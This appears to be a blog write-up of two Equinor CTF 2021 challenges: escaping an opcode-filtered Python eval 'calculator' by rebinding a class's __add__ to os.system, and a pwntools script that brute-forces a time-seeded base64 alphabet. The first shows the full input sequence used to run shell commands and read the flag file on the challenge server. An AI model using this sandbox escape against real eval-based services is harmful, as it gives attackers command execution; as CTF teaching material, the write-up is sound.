[{"content":"Misc ðŸ”¥ Kalk ðŸ”¥  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.get_instructions(co): if opc.opname not in [\u0026#39;LOAD_NAME\u0026#39;, \u0026#39;LOAD_CONST\u0026#39;, \u0026#39;STORE_NAME\u0026#39;, \u0026#39;STORE_ATTR\u0026#39;, \u0026#39;RETURN_VALUE\u0026#39;]: print(\u0026#34;Bonk! \u0026gt;.\u0026lt;\u0026#34;, opc.opname) return eval(co, {}, locals) else: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;eval\u0026#34;) for opc in dis.get_instructions(co): if \u0026#39;CALL\u0026#39; in opc.opname: print(\u0026#39;No U! \u0026gt;.\u0026lt;\u0026#39;) return _ = eval(co, {}, locals | {\u0026#39;math\u0026#39;: Math(), \u0026#39;tease\u0026#39;: os.system}) locals[\u0026#39;_\u0026#39;] = _ return _ locals = {} while True: r = kalk(input(\u0026#39;\u0026gt; \u0026#39;), locals) if r is not None: print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don\u0026rsquo;t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don\u0026rsquo;t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046 \u0026gt; math {} \u0026gt; test = _ \u0026gt; test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046 \u0026gt; math.__class__ \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; \u0026gt; Math = _ \u0026gt; Math \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; Great, now we can overwrite __add__ with os.system\n\u0026gt; tease \u0026lt;built-in function system\u0026gt; \u0026gt; Math.__add__ = _ At last we can set the class of math to be our new class.\n\u0026gt; math {} \u0026gt; math = _ \u0026gt; math.__class__ = Math Now we should be able to run system commands by doing addition.\n\u0026gt; math + \u0026#34;id\u0026#34; uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0 \u0026gt; math + \u0026#34;ls\u0026#34; flag.txt kalk.py ynetd 0 \u0026gt; math + \u0026#34;cat flag.txt\u0026#34; EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\nðŸ”¥ Know your encoding ðŸ”¥  Author: zledge\nDescription: Help us decode some very important words! You might be awarded a flag in the end\nnc io.ept.gg 30045\n We are also provided with a file:\nfrom datetime import datetime from random import Random from time import time def chunks(lst, n): \u0026#34;\u0026#34;\u0026#34;Yield successive n-sized chunks from lst.\u0026#34;\u0026#34;\u0026#34; for i in range(0, len(lst), n): yield lst[i:i + n] ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def special_encoding(word, count): b = Random() b.seed(int(time() * 1000)) if count: a = \u0026#39;\u0026#39;.join(b.sample(ALPHABET,len(ALPHABET))) else: a = ALPHABET encoded = \u0026#39;\u0026#39; for x in chunks(\u0026#34;\u0026#34;.join([bin(int(byte)).lstrip(\u0026#39;0b\u0026#39;).zfill(8) for byte in word.encode(\u0026#34;ascii\u0026#34;)]), 24): y = list(chunks(x, 6)) for value in y: encoded += a[int(value.ljust(6, \u0026#34;0\u0026#34;), 2)] print(f\u0026#34;{datetime.fromtimestamp(int(time()))}- Decode the following: {encoded}\u0026#34;, flush=True) Upon connecting we\u0026rsquo;re greeted with this:\nSomeone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding. Are you ready? After answering we\u0026rsquo;re greeted with a challenge:\n2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm\nSo let\u0026rsquo;s analyze the code:\n chunks is explained with a docstring, so we can move on to special_encoding immediately First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( time() ) This is then multiplied with 1000 to get millisecond precision. (time()*1000) Lastly it\u0026rsquo;s fed into a random generator as a seed. based on a variable count it then either generated a random shuffled alphabet or uses the standard one Then in the following 4 lines it base64 encodes the word (more detailed explanation inside)  Firstly it generates a long bitstring and divides it up into 24 bits at a time Then it\u0026rsquo;s divided furthermore into chunks of 6 bits based on the value of these 6 bits it picks the corresponding character from the \u0026ldquo;alphabet-lookup string\u0026rdquo; a   After looping over the whole bitstring the encoded result is provided prefixed with the server\u0026rsquo;s current time.  Before I show the solution script there\u0026rsquo;s a few gotchas with this challenge that I\u0026rsquo;d like to mention first.\ncount variable As mentioned in the analysis special_encoding chooses which alphabet to use based on a count variable, however we don\u0026rsquo;t know the value of this variable and so we can\u0026rsquo;t be completely sure of which alphabet is used. We can make a educated guess and think that count is like a round counter starting at zero, meaning only the first round will be base64\nTimezones Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time from the server you\u0026rsquo;ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to the time parsed.\ntime() invoked twice So a small detail that\u0026rsquo;s worth noticing is that the time() used to seed the random generator isn\u0026rsquo;t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn\u0026rsquo;t pose any problems for me. But could become a problem if the system is already stressed.\nSo without further adieu, the solve script:\nfrom datetime import datetime from pwn import remote, log from random import Random from Crypto.Util.number import long_to_bytes from string import ascii_lowercase ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def decode(s, mapping): bs = \u0026#34;\u0026#34;.join([bin(mapping.index(c)).lstrip(\u0026#34;0b\u0026#34;).zfill(6) for c in s]) bs = bs[:(len(bs) // 8) * 8] return long_to_bytes(int(bs, 2)) def solve(base_time, chall): for drift in range(1000): tm = base_time * 1000 + drift b = Random() b.seed(tm) for mapping in [\u0026#39;\u0026#39;.join(b.sample(ALPHABET, len(ALPHABET))), ALPHABET]: bts = decode(chall, mapping) if all([chr(char) in ascii_lowercase for char in bts]): return bts else: log.error(\u0026#34;Couldn\u0026#39;t find solution\u0026#34;) r = remote(\u0026#34;io.ept.gg\u0026#34;, 30045) r.sendline(b\u0026#34;y\u0026#34;) r.recvline() r.recvline() for i in range(100): chal = r.recvline().decode() dt = datetime.fromisoformat(chal.split(\u0026#34; - \u0026#34;)[0]).strftime(\u0026#34;%s\u0026#34;) server_time = int(dt) + 3600 # adjust to the same timezone as the server ans = solve(server_time, chal.split(\u0026#34;: \u0026#34;)[1].strip()) print(ans) r.sendline(ans) assert r.recvline() == b\u0026#34;Correct!\\n\u0026#34; r.interactive() Further explanation brute force So since we know the time the random alphabet was generated we can just reproduce it locally. After we have the time (that\u0026rsquo;s corrected for the timezone) we have to do some brute force, because the time value we\u0026rsquo;re provided with is only in second resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.\ndecoding Now inside the loop we can feed these time values into the Random.seed() function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it\u0026rsquo;s corresponding position in the alphabet, then we convert that value to binary, stripping the 0b and ensuring it\u0026rsquo;s 6 chars long. After that we strip the bitstring into the nearest length that\u0026rsquo;s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we\u0026rsquo;re done.\nsubmitting So now we have a possible correct result, but since we\u0026rsquo;re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable and ASCII-lowercase, then we can be pretty certain that we\u0026rsquo;ve found the correct answer. But we won\u0026rsquo;t know for sure before the server responds with Correct!. Again if we bruteforced with a wider range for the drift we might begin to get false positives.\nFlag: EPT{kn0w-y0ur-en0ding!}\n","permalink":"https://bootplug.io/posts/ctf/equinorctf/","summary":"Misc ðŸ”¥ Kalk ðŸ”¥  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.","title":"Equinor CTF 2021"}]